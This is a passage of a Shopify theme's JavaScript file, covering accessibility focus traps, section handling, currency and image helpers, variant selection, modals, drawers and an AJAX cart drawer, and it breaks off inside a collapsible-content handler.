window.theme = window.theme || {};
window.slate = window.slate || {};

window.lazySizesConfig = window.lazySizesConfig || {};
lazySizesConfig.expFactor = 4;

(function($) {
    var $ = jQuery = $;

    slate.utils = {
        /**
         * _.defaultTo from lodash
         * Checks `value` to determine whether a default value should be returned in
         * its place. The `defaultValue` is returned if `value` is `NaN`, `null`,
         * or `undefined`.
         * Source: https://github.com/lodash/lodash/blob/master/defaultTo.js
         *
         * @param {*} value - Value to check
         * @param {*} defaultValue - Default value
         * @returns {*} - Returns the resolved value
         */
        defaultTo: function(value, defaultValue) {
            return (value == null || value !== value) ? defaultValue : value
        }
    };

    slate.a11y = {

        /**
         * Traps the focus in a particular container
         *
         * @param {object} options - Options to be used
         * @param {jQuery} options.$container - Container to trap focus within
         * @param {jQuery} options.$elementToFocus - Element to be focused when focus leaves container
         * @param {string} options.namespace - Namespace used for new focus event handler
         */
        trapFocus: function(options) {
            var eventName = options.namespace ?
                'focusin.' + options.namespace :
                'focusin';

            if (!options.$elementToFocus) {
                options.$elementToFocus = options.$container;
            }

            options.$container.attr('tabindex', '-1');
            options.$elementToFocus.focus();

            $(document).off('focusin');

            $(document).on(eventName, function(evt) {
                if (options.$container[0] !== evt.target && !options.$container.has(evt.target).length) {
                    options.$container.focus();
                }
            });
        },

        /**
         * Removes the trap of focus in a particular container
         *
         * @param {object} options - Options to be used
         * @param {jQuery} options.$container - Container to trap focus within
         * @param {string} options.namespace - Namespace used for new focus event handler
         */
        removeTrapFocus: function(options) {
            var eventName = options.namespace ?
                'focusin.' + options.namespace :
                'focusin';

            if (options.$container && options.$container.length) {
                options.$container.removeAttr('tabindex');
            }

            $(document).off(eventName);
        },


        // Not from Slate, but fit in the a11y category
        lockMobileScrolling: function(namespace, $element) {
            if ($element) {
                var $el = $element;
            } else {
                var $el = $(document.documentElement).add('body');
            }
            $el.on('touchmove' + namespace, function() {
                return false;
            });
        },

        unlockMobileScrolling: function(namespace, $element) {
            if ($element) {
                var $el = $element;
            } else {
                var $el = $(document.documentElement).add('body');
            }
            $el.off(namespace);
        }
    };

    theme.Sections = function Sections() {
        this.constructors = {};
        this.instances = [];

        $(document)
            .on('shopify:section:load', this._onSectionLoad.bind(this))
            .on('shopify:section:unload', this._onSectionUnload.bind(this))
            .on('shopify:section:select', this._onSelect.bind(this))
            .on('shopify:section:deselect', this._onDeselect.bind(this))
            .on('shopify:block:select', this._onBlockSelect.bind(this))
            .on('shopify:block:deselect', this._onBlockDeselect.bind(this));
    };


  

    theme.Sections.prototype = $.extend({}, theme.Sections.prototype, {
      
        createInstance: function(container, constructor) {
            var $container = $(container);
            var id = $container.attr('data-section-id');
            var type = $container.attr('data-section-type');

            constructor = constructor || this.constructors[type];

            if (typeof constructor === 'undefined') {
                return;
            }

            var instance = $.extend(new constructor(container), {
                id: id,
                type: type,
                container: container
            });

            this.instances.push(instance);
        },

        _onSectionLoad: function(evt, subSection, subSectionId) {
            if (AOS) {
                AOS.refreshHard();
            }
            var container = subSection ? subSection : $('[data-section-id]', evt.target)[0];

            if (!container) {
                return;
            }

            this.createInstance(container);

            var instance = subSection ? subSectionId : this._findInstance(evt.detail.sectionId);

            if (!subSection) {
                this._loadSubSections();
            }

            // Run JS only in case of the section being selected in the editor
            // before merchant clicks "Add"
            if (instance && typeof instance.onLoad === 'function') {
                instance.onLoad(evt);
            }
        },

        _loadSubSections: function() {
            if (AOS) {
                AOS.refreshHard();
            }
            $('[data-subsection]').each(function(evt, el) {
                this._onSectionLoad(null, el, $(el).data('section-id'));
            }.bind(this));
        },

        _onSectionUnload: function(evt) {
            var instance = this._removeInstance(evt.detail.sectionId);
            if (instance && typeof instance.onUnload === 'function') {
                instance.onUnload(evt);
            }
        },

        _onSelect: function(evt) {
            var instance = this._findInstance(evt.detail.sectionId);

            if (instance && typeof instance.onSelect === 'function') {
                instance.onSelect(evt);
            }
        },

        _onDeselect: function(evt) {
            var instance = this._findInstance(evt.detail.sectionId);

            if (instance && typeof instance.onDeselect === 'function') {
                instance.onDeselect(evt);
            }
        },

        _onBlockSelect: function(evt) {
            var instance = this._findInstance(evt.detail.sectionId);

            if (instance && typeof instance.onBlockSelect === 'function') {
                instance.onBlockSelect(evt);
            }
        },

        _onBlockDeselect: function(evt) {
            var instance = this._findInstance(evt.detail.sectionId);

            if (instance && typeof instance.onBlockDeselect === 'function') {
                instance.onBlockDeselect(evt);
            }
        },

        _findInstance: function(id) {
            for (var i = 0; i < this.instances.length; i++) {
                if (this.instances[i].id === id) {
                    return this.instances[i];
                }
            }
        },

        _removeInstance: function(id) {
            var i = this.instances.length;
            var instance;

            while (i--) {
                if (this.instances[i].id === id) {
                    instance = this.instances[i];
                    this.instances.splice(i, 1);
                    break;
                }
            }

            return instance;
        },

        register: function(type, constructor) {
            this.constructors[type] = constructor;
            var $sections = $('[data-section-type=' + type + ']');

            $sections.each(function(index, container) {
                this.createInstance(container, constructor);
            }.bind(this));
        }
    });


    /**
     * Currency Helpers
     * -----------------------------------------------------------------------------
     * A collection of useful functions that help with currency formatting
     *
     * Current contents
     * - formatMoney - Takes an amount in cents and returns it as a formatted dollar value.
     *
     * Alternatives
     * - Accounting.js - http://openexchangerates.github.io/accounting.js/
     *
     */

    theme.Currency = (function() {
        var moneyFormat = '$';

        function formatMoney(cents, format) {
            if (typeof cents === 'string') {
                cents = cents.replace('.', '');
            }
            var value = '';
            var placeholderRegex = /\{\{\s*(\w+)\s*\}\}/;
            var formatString = (format || moneyFormat);

            function formatWithDelimiters(number, precision, thousands, decimal) {
                precision = slate.utils.defaultTo(precision, 2);
                thousands = slate.utils.defaultTo(thousands, ',');
                decimal = slate.utils.defaultTo(decimal, '.');

                if (isNaN(number) || number == null) {
                    return 0;
                }

                number = (number / 100.0).toFixed(precision);

                var parts = number.split('.');
                var dollarsAmount = parts[0].replace(/(\d)(?=(\d\d\d)+(?!\d))/g, '$1' + thousands);
                var centsAmount = parts[1] ? (decimal + parts[1]) : '';

                return dollarsAmount + centsAmount;
            }

            switch (formatString.match(placeholderRegex)[1]) {
                case 'amount':
                    value = formatWithDelimiters(cents, 2);
                    break;
                case 'amount_no_decimals':
                    value = formatWithDelimiters(cents, 0);
                    break;
                case 'amount_with_comma_separator':
                    value = formatWithDelimiters(cents, 2, '.', ',');
                    break;
                case 'amount_no_decimals_with_comma_separator':
                    value = formatWithDelimiters(cents, 0, '.', ',');
                    break;
                case 'amount_no_decimals_with_space_separator':
                    value = formatWithDelimiters(cents, 0, ' ');
                    break;
            }

            return formatString.replace(placeholderRegex, value);
        }

        return {
            formatMoney: formatMoney
        }
    })();


    /**
     * Image Helper Functions
     * -----------------------------------------------------------------------------
     * A collection of functions that help with basic image operations.
     *
     */

    theme.Images = (function() {

        /**
         * Find the Shopify image attribute size
         *
         * @param {string} src
         * @returns {null}
         */
        function imageSize(src) {
            if (!src) {
                return '620x'; // default based on theme
            }

            var match = src.match(/.+_((?:pico|icon|thumb|small|compact|medium|large|grande)|\d{1,4}x\d{0,4}|x\d{1,4})[_\.@]/);

            if (match !== null) {
                return match[1];
            } else {
                return null;
            }
        }

        /**
         * Adds a Shopify size attribute to a URL
         *
         * @param src
         * @param size
         * @returns {*}
         */
        function getSizedImageUrl(src, size) {
            if (size == null) {
                return src;
            }

            if (size === 'master') {
                return this.removeProtocol(src);
            }

            var match = src.match(/\.(jpg|jpeg|gif|png|bmp|bitmap|tiff|tif)(\?v=\d+)?$/i);

            if (match != null) {
                var prefix = src.split(match[0]);
                var suffix = match[0];

                return this.removeProtocol(prefix[0] + '_' + size + suffix);
            }

            return null;
        }

        function removeProtocol(path) {
            return path.replace(/http(s)?:/, '');
        }

        return {
            imageSize: imageSize,
            getSizedImageUrl: getSizedImageUrl,
            removeProtocol: removeProtocol
        };
    })();

    slate.Variants = (function() {

        function Variants(options) {
            this.$container = options.$container;
            this.variants = options.variants;
            this.singleOptionSelector = options.singleOptionSelector;
            this.originalSelectorId = options.originalSelectorId;
            this.enableHistoryState = options.enableHistoryState;
            this.currentVariant = this._getVariantFromOptions();

            $(this.singleOptionSelector, this.$container).on('change', this._onSelectChange.bind(this));
        }

        Variants.prototype = $.extend({}, Variants.prototype, {

            _getCurrentOptions: function() {
                var currentOptions = $.map($(this.singleOptionSelector, this.$container), function(element) {
                    var $element = $(element);
                    var type = $element.attr('type');
                    var currentOption = {};

                    if (type === 'radio' || type === 'checkbox') {
                        if ($element[0].checked) {
                            currentOption.value = $element.val();
                            currentOption.index = $element.data('index');

                            return currentOption;
                        } else {
                            return false;
                        }
                    } else {
                        currentOption.value = $element.val();
                        currentOption.index = $element.data('index');

                        return currentOption;
                    }
                });

                // remove any unchecked input values if using radio buttons or checkboxes
                currentOptions = this._compact(currentOptions);

                return currentOptions;
            },

            _getVariantFromOptions: function() {
                var selectedValues = this._getCurrentOptions();
                var variants = this.variants;
                var found = false;

                variants.forEach(function(variant) {
                    var match = true;
                    var options = variant.options;

                    selectedValues.forEach(function(option) {
                        // console.log('try to match ' + option.value + ' with ' + variant[option.index]);

                        if (match) {
                            match = (variant[option.index] === option.value);
                        }
                    });

                    if (match) {
                        found = variant;
                    }
                });

                return found || null;
            },

            _onSelectChange: function() {
                var variant = this._getVariantFromOptions();

                this.$container.trigger({
                    type: 'variantChange',
                    variant: variant
                });

                if (!variant) {
                    return;
                }

                this._updateMasterSelect(variant);
                this._updateImages(variant);
                this._updatePrice(variant);
                this._updateSKU(variant);
                this.currentVariant = variant;

                if (this.enableHistoryState) {
                    this._updateHistoryState(variant);
                }
            },

            _updateImages: function(variant) {
                var variantImage = variant.featured_image || {};
                var currentVariantImage = this.currentVariant.featured_image || {};

                if (!variant.featured_image || variantImage.src === currentVariantImage.src) {
                    return;
                }

                this.$container.trigger({
                    type: 'variantImageChange',
                    variant: variant
                });
            },

            _updatePrice: function(variant) {
                if (variant.price === this.currentVariant.price && variant.compare_at_price === this.currentVariant.compare_at_price) {
                    return;
                }

                this.$container.trigger({
                    type: 'variantPriceChange',
                    variant: variant
                });
            },

            _updateSKU: function(variant) {
                if (variant.sku === this.currentVariant.sku) {
                    return;
                }

                this.$container.trigger({
                    type: 'variantSKUChange',
                    variant: variant
                });
            },

            _updateHistoryState: function(variant) {
                if (!history.replaceState || !variant) {
                    return;
                }

                var newurl = window.location.protocol + '//' + window.location.host + window.location.pathname + '?variant=' + variant.id;
                window.history.replaceState({
                    path: newurl
                }, '', newurl);
            },

            _updateMasterSelect: function(variant) {
                $(this.originalSelectorId, this.$container).val(variant.id);
            },

            // _.compact from lodash
            // https://github.com/lodash/lodash/blob/4d4e452ade1e78c7eb890968d851f837be37e429/compact.js
            _compact: function(array) {
                var index = -1,
                    length = array == null ? 0 : array.length,
                    resIndex = 0,
                    result = [];

                while (++index < length) {
                    var value = array[index];
                    if (value) {
                        result[resIndex++] = value;
                    }
                }
                return result;
            }
        });

        return Variants;
    })();

    slate.rte = {
        init: function() {
            slate.rte.wrapTable();
            slate.rte.wrapVideo();
            slate.rte.imageLinks();
        },

        wrapTable: function() {
            $('.rte table').wrap('<div class="table-wrapper"></div>');
        },

        wrapVideo: function() {
            var $iframeVideo = $('.rte iframe[src*="youtube.com/embed"], .rte iframe[src*="player.vimeo"]');
            var $iframeReset = $iframeVideo.add('iframe#admin_bar_iframe');

            $iframeVideo.each(function() {
                // Add wrapper to make video responsive
                if (!$(this).parents('.video-wrapper').length) {
                    $(this).wrap('<div class="video-wrapper"></div>');
                }
            });

            $iframeReset.each(function() {
                // Re-set the src attribute on each iframe after page load
                // for Chrome's "incorrect iFrame content on 'back'" bug.
                // https://code.google.com/p/chromium/issues/detail?id=395791
                // Need to specifically target video and admin bar
                this.src = this.src;
            });
        },

        // Remove CSS that adds animated underline under image links
        imageLinks: function() {
            $('.rte a img').parent().addClass('rte__image');
        }
    };


    theme.Modals = (function() {
        function Modal(id, name, options) {
            var defaults = {
                close: '.js-modal-close',
                open: '.js-modal-open-' + name,
                openClass: 'modal--is-active',
                closingClass: 'modal--is-closing',
                bodyOpenClass: 'modal-open',
                bodyOpenSolidClass: 'modal-open--solid',
                bodyClosingClass: 'modal-closing',
                closeOffContentClick: true
            };

            this.id = id;
            this.$modal = $('#' + id);

            if (!this.$modal.length) {
                return false;
            }

            this.nodes = {
                $parent: $('html').add('body'),
                $modalContent: this.$modal.find('.modal__inner')
            };

            this.config = $.extend(defaults, options);
            this.modalIsOpen = false;
            this.$focusOnOpen = this.config.focusOnOpen ? $(this.config.focusOnOpen) : this.$modal;
            this.isSolid = this.config.solid;

            this.init();
        }

        Modal.prototype.init = function() {
            var $openBtn = $(this.config.open);

            // Add aria controls
            $openBtn.attr('aria-expanded', 'false');

            $(this.config.open).on('click', this.open.bind(this));
            this.$modal.find(this.config.close).on('click', this.close.bind(this));

            // Close modal if a drawer is opened
            $('body').on('drawerOpen', function() {
                this.close();
            }.bind(this));
        };

        Modal.prototype.open = function(evt) {
            // Keep track if modal was opened from a click, or called by another function
            var externalCall = false;

            // don't open an opened modal
            if (this.modalIsOpen) {
                return;
            }

            // Prevent following href if link is clicked
            if (evt) {
                evt.preventDefault();
            } else {
                externalCall = true;
            }

            // Without this, the modal opens, the click event bubbles up to $nodes.page
            // which closes the modal.
            if (evt && evt.stopPropagation) {
                evt.stopPropagation();
                // save the source of the click, we'll focus to this on close
                this.$activeSource = $(evt.currentTarget);
            }

            if (this.modalIsOpen && !externalCall) {
                this.close();
            }

            this.$modal
                .prepareTransition()
                .addClass(this.config.openClass);
            this.nodes.$parent.addClass(this.config.bodyOpenClass);

            if (this.isSolid) {
                this.nodes.$parent.addClass(this.config.bodyOpenSolidClass);
            }

            this.modalIsOpen = true;

            slate.a11y.trapFocus({
                $container: this.$modal,
                $elementToFocus: this.$focusOnOpen,
                namespace: 'modal_focus'
            });

            if (this.$activeSource && this.$activeSource.attr('aria-expanded')) {
                this.$activeSource.attr('aria-expanded', 'true');
            }

            $('body').trigger('modalOpen.' + this.id);

            this.bindEvents();
        };

        Modal.prototype.close = function() {
            // don't close a closed modal
            if (!this.modalIsOpen) {
                return;
            }

            // deselect any focused form elements
            $(document.activeElement).trigger('blur');

            this.$modal
                .prepareTransition()
                .removeClass(this.config.openClass)
                .addClass(this.config.closingClass);
            this.nodes.$parent.removeClass(this.config.bodyOpenClass);
            this.nodes.$parent.addClass(this.config.bodyClosingClass);
            var o = this;
            window.setTimeout(function() {
                o.nodes.$parent.removeClass(o.config.bodyClosingClass);
                o.$modal.removeClass(o.config.closingClass);
            }, 500); // modal close css transition

            if (this.isSolid) {
                this.nodes.$parent.removeClass(this.config.bodyOpenSolidClass);
            }

            this.modalIsOpen = false;

            slate.a11y.removeTrapFocus({
                $container: this.$modal,
                namespace: 'modal_focus'
            });

            if (this.$activeSource && this.$activeSource.attr('aria-expanded')) {
                this.$activeSource.attr('aria-expanded', 'false').focus();
            }

            $('body').trigger('modalClose.' + this.id);

            this.unbindEvents();
        };

        Modal.prototype.bindEvents = function() {
            // Pressing escape closes modal
            this.nodes.$parent.on('keyup.modal', function(evt) {
                if (evt.keyCode === 27) {
                    this.close();
                }
            }.bind(this));

            if (this.config.closeOffContentClick) {
                // Clicking outside of the modal content also closes it
                this.$modal.on('click.modal', this.close.bind(this));

                // Exception to above: clicking anywhere on the modal content will NOT close it
                this.nodes.$modalContent.on('click.modal', function(evt) {
                    evt.stopImmediatePropagation();
                });
            }
        };

        Modal.prototype.unbindEvents = function() {
            this.nodes.$parent.off('.modal');

            if (this.config.closeOffContentClick) {
                this.$modal.off('.modal');
                this.nodes.$modalContent.off('.modal');
            }
        };

        return Modal;
    })();

    theme.Drawers = (function() {
        function Drawer(id, name, ignoreScrollLock) {
            this.config = {
                id: id,
                close: '.js-drawer-close',
                open: '.js-drawer-open-' + name,
                openClass: 'js-drawer-open',
                closingClass: 'js-drawer-closing',
                activeDrawer: 'drawer--is-open',
                namespace: '.drawer-' + name
            };

            this.$nodes = {
                parent: $(document.documentElement).add('body'),
                page: $('#MainContent')
            };

            this.$drawer = $('#' + id);

            if (!this.$drawer.length) {
                return false;
            }

            this.isOpen = false;
            this.ignoreScrollLock = ignoreScrollLock;
            this.init();
        };

        Drawer.prototype = $.extend({}, Drawer.prototype, {
            init: function() {
                var $openBtn = $(this.config.open);

                // Add aria controls
                $openBtn.attr('aria-expanded', 'false');

                $openBtn.on('click', this.open.bind(this));
                this.$drawer.find(this.config.close).on('click', this.close.bind(this));
            },

            open: function(evt) {
                if (evt) {
                    evt.preventDefault();
                }

                if (this.isOpen) {
                    return;
                }

                // Without this the drawer opens, the click event bubbles up to $nodes.page which closes the drawer.
                if (evt && evt.stopPropagation) {
                    evt.stopPropagation();
                    // save the source of the click, we'll focus to this on close
                    this.$activeSource = $(evt.currentTarget);
                }

                this.$drawer.prepareTransition().addClass(this.config.activeDrawer);

                this.$nodes.parent.addClass(this.config.openClass);
                this.isOpen = true;

                slate.a11y.trapFocus({
                    $container: this.$drawer,
                    namespace: 'drawer_focus'
                });

                $('body').trigger('drawerOpen.' + this.config.id);

                if (this.$activeSource && this.$activeSource.attr('aria-expanded')) {
                    this.$activeSource.attr('aria-expanded', 'true');
                }

                this.bindEvents();
            },

            close: function() {
                if (!this.isOpen) {
                    return;
                }

                // deselect any focused form elements
                $(document.activeElement).trigger('blur');

                this.$drawer.prepareTransition().removeClass(this.config.activeDrawer);

                this.$nodes.parent.removeClass(this.config.openClass);
                this.$nodes.parent.addClass(this.config.closingClass);
                var o = this;
                window.setTimeout(function() {
                    o.$nodes.parent.removeClass(o.config.closingClass);
                }, 500);

                this.isOpen = false;

                slate.a11y.removeTrapFocus({
                    $container: this.$drawer,
                    namespace: 'drawer_focus'
                });

                if (this.$activeSource && this.$activeSource.attr('aria-expanded')) {
                    this.$activeSource.attr('aria-expanded', 'false');
                }

                this.unbindEvents();
            },

            bindEvents: function() {
                if (!this.ignoreScrollLock) {
                    slate.a11y.lockMobileScrolling(this.config.namespace, this.$nodes.page);
                }

                // Clicking out of drawer closes it.
                // Check to see if clicked on element in drawer
                // because of any drawer built witin #MainContent
                this.$nodes.page.on('click' + this.config.namespace, function(evt) {
                    var $target = $(evt.target);
                    var doNotClose = this.elementInsideDrawer($target);
                    if (!doNotClose) {
                        this.close();
                        return false;
                    }

                }.bind(this));

                // Pressing escape closes drawer
                this.$nodes.parent.on('keyup' + this.config.namespace, function(evt) {
                    if (evt.keyCode === 27) {
                        this.close();
                    }
                }.bind(this));
            },

            unbindEvents: function() {
                if (!this.ignoreScrollLock) {
                    slate.a11y.unlockMobileScrolling(this.config.namespace, this.$nodes.page);
                }
                this.$nodes.parent.off(this.config.namespace);
                this.$nodes.page.off(this.config.namespace);
            },

            // Check if clicked element is inside the drawer
            elementInsideDrawer: function($el) {
                return this.$drawer.find($el).length;
            }
        });

        return Drawer;
    })();

    theme.cart = {
        getCart: function() {
            return $.getJSON('/cart.js');
        },

        changeItem: function(key, qty) {
            return this._updateCart({
                type: 'POST',
                url: '/cart/change.js',
                data: 'quantity=' + qty + '&id=' + key,
                dataType: 'json'
            });
        },

        addItemFromForm: function(data) {
            return this._updateCart({
                type: 'POST',
                url: '/cart/add.js',
                data: data,
                dataType: 'json'
            });
        },

        _updateCart: function(params) {
            return $.ajax(params)
                .then(function(cart) {
                    return cart;
                }.bind(this))
        },

        updateNote: function(note) {
            var params = {
                type: 'POST',
                url: '/cart/update.js',
                data: 'note=' + theme.cart.attributeToString(note),
                dataType: 'json',
                success: function(cart) {},
                error: function(XMLHttpRequest, textStatus) {}
            };

            $.ajax(params);
        },

        attributeToString: function(attribute) {
            if ((typeof attribute) !== 'string') {
                attribute += '';
                if (attribute === 'undefined') {
                    attribute = '';
                }
            }
            return $.trim(attribute);
        }
    }

    $(function() {
        // Add a loading indicator on the cart checkout button (/cart and drawer)
        $('body').on('click', '.cart__checkout', function() {
            $(this).addClass('btn--loading');
        });

        $('body').on('change', 'textarea[name="note"]', function() {
            var newNote = $(this).val();
            theme.cart.updateNote(newNote);
        });


        // Custom JS to prevent checkout without confirming terms and conditions
        $('body').on('click', '.cart__checkout--ajax', function(evt) {
            if ($('#CartAgree').is(':checked')) {} else {
                alert(theme.strings.cartTermsConfirmation);
                $(this).removeClass('btn--loading');
                return false;
            }
        });

        $('body').on('click', '.cart__checkout--page', function(evt) {
            if ($('#CartPageAgree').is(':checked')) {} else {
                alert(theme.strings.cartTermsConfirmation);
                $(this).removeClass('btn--loading');
                return false;
            }
        });
    });

    theme.QtySelector = (function() {
        var classes = {
            input: '.js-qty__num',
            plus: '.js-qty__adjust--plus',
            minus: '.js-qty__adjust--minus'
        };

        function QtySelector($el, options) {
            this.$wrapper = $el;
            this.$input = $el.find(classes.input);
            this.$plus = $el.find(classes.plus);
            this.$minus = $el.find(classes.minus);
            this.minValue = this.$input.attr('min') || 1;

            var defaults = {
                namespace: null,
                key: this.$input.data('id')
            };

            this.options = $.extend(defaults, options);

            this.initEventListeners();
        };

        QtySelector.prototype = $.extend({}, QtySelector.prototype, {
            initEventListeners: function() {
                this.$plus.on('click', function() {
                    var qty = this.validateQty(this.$input.val());
                    this.addQty(qty);
                }.bind(this));

                this.$minus.on('click', function() {
                    var qty = this.validateQty(this.$input.val());
                    this.subtractQty(qty);
                }.bind(this));

                this.$input.on('change', function() {
                    var qty = this.validateQty(this.$input.val());
                    this.changeQty(qty);
                }.bind(this));
            },

            addQty: function(number) {
                var qty = number + 1;
                this.changeQty(qty);
            },

            subtractQty: function(number) {
                var qty = number - 1;
                if (qty <= this.minValue) {
                    qty = this.minValue;
                }
                this.changeQty(qty);
            },

            changeQty: function(qty) {
                this.$input.val(qty);
                $('body').trigger('qty' + this.options.namespace, [this.options.key, qty]);
            },

            validateQty: function(number) {
                if ((parseFloat(number) == parseInt(number)) && !isNaN(number)) {
                    // We have a valid number!
                } else {
                    // Not a number. Default to 1.
                    number = 1;
                }
                return parseInt(number);
            }
        });

        return QtySelector;
    })();

    theme.CartDrawer = (function() {
        var config = {
            namespace: '.ajaxcart'
        };

        var selectors = {
            drawer: '#CartDrawer',
            container: '#CartContainer',
            template: '#CartTemplate',
            fixedFooter: '.drawer__footer--fixed',
            fixedInnerContent: '.drawer__inner--has-fixed-footer',
            cartBubble: '.cart-link__bubble'
        };

        function CartDrawer() {
            this.status = {
                loaded: false,
                loading: false
            };

            this.drawer = new theme.Drawers('CartDrawer', 'cart');

            // Prep handlebars template
            var source = $(selectors.template).html();
            this.template = Handlebars.compile(source);

            // Build cart on page load so it's ready in the drawer
            theme.cart.getCart().then(this.buildCart.bind(this));

            this.initEventListeners();
        };

        CartDrawer.prototype = $.extend({}, CartDrawer.prototype, {
            initEventListeners: function() {
                $('body').on('updateCart' + config.namespace, this.initQtySelectors.bind(this));
                $('body').on('updateCart' + config.namespace, this.sizeFooter.bind(this));
                $('body').on('updateCart' + config.namespace, this.updateCartNotification.bind(this));
                $('body').on('drawerOpen.CartDrawer', this.sizeFooter.bind(this));

                $(window).on('resize' + config.namespace, $.debounce(150, this.sizeFooter.bind(this)));

                $('body').on('added.ajaxProduct', function() {
                    theme.cart.getCart().then(function(cart) {
                        this.buildCart(cart, true);
                    }.bind(this));
                }.bind(this));
            },

            buildCart: function(cart, openDrawer) {
                this.loading(true);
                this.emptyCart();

                if (cart.item_count === 0) {
                    $(selectors.container).append('<p class="appear-animation appear-delay-3">' + theme.strings.cartEmpty + '</p>');
                } else {
                    var items = [];
                    var item = {};
                    var data = {};
                    var animation_row = 1;

                    $.each(cart.items, function(index, product) {

                        var prodImg;
                        if (product.image !== null) {
                            prodImg = product.image.replace(/(\.[^.]*)$/, "_180x$1");
                        } else {
                            prodImg = '//cdn.shopify.com/s/assets/admin/no-image-medium-cc9732cb976dd349a0df1d39816fbcc7.gif';
                        }

                        if (product.properties !== null) {
                            $.each(product.properties, function(key, value) {
                                if (key.charAt(0) === '_' || !value) {
                                    delete product.properties[key];
                                }
                            });
                        }

                        animation_row += 2;

                        item = {
                            key: product.key,
                            url: product.url,
                            img: prodImg,
                            animationRow: animation_row,
                            name: product.product_title,
                            variation: product.variant_title,
                            properties: product.properties,
                            itemQty: product.quantity,
                            price: theme.Currency.formatMoney(product.price, theme.settings.moneyFormat),
                            discountedPrice: theme.Currency.formatMoney((product.price - (product.total_discount / product.quantity)), theme.settings.moneyFormat),
                            discounts: product.discounts,
                            discountsApplied: product.price === (product.price - product.total_discount) ? false : true,
                            vendor: product.vendor
                        };  
                      
                       if(product.product_type == 'OPTIONS_HIDDEN_PRODUCT') {
                          item['bold'] = true;
                        }

                        items.push(item);
                    });

                    animation_row += 2;

                    data = {
                        items: items,
                        note: cart.note,
                        lastAnimationRow: animation_row,
                        totalPrice: theme.Currency.formatMoney(cart.total_price, theme.settings.moneyFormat),
                        totalCartDiscount: cart.total_discount === 0 ? 0 : theme.strings.cartSavings.replace('[savings]', theme.Currency.formatMoney(cart.total_discount, theme.settings.moneyFormat))
                    };

                    $(selectors.container).append(this.template(data));
                }

                this.status.loaded = true;
                this.loading(false);

                if ($('body').hasClass('currencies-enabled')) {
                    theme.currencySwitcher.ajaxrefresh();
                }

                $('body').trigger('updateCart' + config.namespace, cart);

                if (window.Shopify && Shopify.StorefrontExpressButtons) {
                    Shopify.StorefrontExpressButtons.initialize();

                    // Resize footer after arbitrary delay for buttons to load
                    setTimeout(function() {
                        this.sizeFooter();
                    }.bind(this), 800);
                }

                // If specifically asked, open the cart drawer (only happens after product added from form)
                if (openDrawer === true) {
                    this.drawer.open();
                }
            },

            initQtySelectors: function() {
                $(selectors.container).find('.js-qty__wrapper').each(function(index, el) {
                    var selector = new theme.QtySelector($(el), {
                        namespace: '.cart-drawer'
                    });
                }.bind(this));

                $('body').on('qty.cart-drawer', this.updateItem.bind(this));
            },

            updateItem: function(evt, key, qty) {
                if (this.status.loading) {
                    return;
                }

                this.loading(true);

                theme.cart.changeItem(key, qty)
                    .then(function(cart) {
                        this.updateSuccess(cart);
                    }.bind(this))
                    .catch(function(XMLHttpRequest) {
                        this.updateError(XMLHttpRequest)
                    }.bind(this))
                    .always(function() {
                        this.loading(false);
                    }.bind(this));
            },

            loading: function(state) {
                this.status.loading = state;

                if (state) {
                    $(selectors.container).addClass('is-loading');
                } else {
                    $(selectors.container).removeClass('is-loading');
                }
            },

            emptyCart: function() {
                $(selectors.container).empty();
            },

            updateSuccess: function(cart) {
                this.buildCart(cart)
            },

            updateError: function(XMLHttpRequest) {
                if (XMLHttpRequest.responseJSON && XMLHttpRequest.responseJSON.description) {
                    console.warn(XMLHttpRequest.responseJSON.description);
                }
            },

            // Update elements after cart is updated
            sizeFooter: function() {
                // Stop if our drawer doesn't have a fixed footer
                if (!$(selectors.drawer).hasClass('drawer--has-fixed-footer')) {
                    return;
                }

                // Elements are reprinted regularly so selectors are not cached
                var $cartFooter = $(selectors.drawer).find(selectors.fixedFooter).removeAttr('style');
                var $cartInner = $(selectors.drawer).find(selectors.fixedInnerContent).removeAttr('style');
                var cartFooterHeight = $cartFooter.outerHeight();

                $cartInner.css('bottom', cartFooterHeight);
                $cartFooter.css('height', cartFooterHeight);
            },

            updateCartNotification: function(evt, cart) {
                if (cart.items.length > 0) {
                    $(selectors.cartBubble).addClass('cart-link__bubble--visible');
                } else {
                    $(selectors.cartBubble).removeClass('cart-link__bubble--visible');
                }
            }
        });

        return CartDrawer;
    })();

    theme.AjaxProduct = (function() {
        var status = {
            loading: false
        };

        function ProductForm($form) {
            this.$form = $form;
            this.$addToCart = this.$form.find('.add-to-cart');

            if (this.$form.length) {
                this.$form.on('submit', this.addItemFromForm.bind(this));
            }
        };

        ProductForm.prototype = $.extend({}, ProductForm.prototype, {
            addItemFromForm: function(evt, callback) {
                evt.preventDefault();

                if (status.loading) {
                    return;
                }

                // Loading indicator on add to cart button
                this.$addToCart.addClass('btn--loading');

                status.loading = true;

              if(this.$form[0].querySelector('.multiselect_wrap')) {  
              console.log('multi');
              var data = {items: Array.from(this.$form[0].querySelectorAll('.multiselect_wrap [name="id"]:checked')).map(x => ({id:x.value, quantity: x.getAttribute('quantity')})) };                
              }else{
                var data = this.$form.serialize();
              }
                theme.cart.addItemFromForm(data)
                    .then(function(product) {      
                        this.success(product);
                    }.bind(this))
                    .catch(function(XMLHttpRequest) {
                        this.error(XMLHttpRequest)
                    }.bind(this))
                    .always(function() {
                        status.loading = false;
                        this.$addToCart.removeClass('btn--loading');
                    }.bind(this));
            },

            success: function(product) {
                this.$form.find('.errors').remove();
                $('body').trigger('added.ajaxProduct');
            },

            error: function(XMLHttpRequest) {
                this.$form.find('.errors').remove();

                if (XMLHttpRequest.responseJSON && XMLHttpRequest.responseJSON.description) {
                    console.warn(XMLHttpRequest.responseJSON.description);

                    this.$form.prepend('<div class="errors text-center">' + XMLHttpRequest.responseJSON.description + '</div>');
                }
            }
        });

        return ProductForm;
    })();

    theme.collapsibles = (function() {

        var selectors = {
            trigger: '.collapsible-trigger',
            module: '.collapsible-content',
            moduleInner: '.collapsible-content__inner'
        };

        var classes = {
            hide: 'hide',
            open: 'is-open',
            autoHeight: 'collapsible--auto-height'
        };

        var isTransitioning = false;

        function init() {
            $(selectors.trigger).each(function() {
                var $el = $(this);
                var state = $el.hasClass(classes.open);
                $el.attr('aria-expanded', state);
            });

            // Event listeners (hack for modals)
            $('body, .modal__inner').on('click', selectors.trigger, function() {
                if (isTransitioning) {
                    return;
                }

                isTransitioning = true;

                var $el = $(this);
                var isOpen = $el.hasClass(classes.open);
                var moduleId = $el.attr('aria-controls');
                var $module = $('#' + moduleId);
                var height = $module.find(selectors.moduleInner).outerHeight();
                var isAutoHeight = $el.hasClass(classes.autoHeight);

                // If isAutoHeight, set the height to 0 just after setting the actual height
                // so the closing animation works nicely
                if (isOpen && isAutoHeight) {
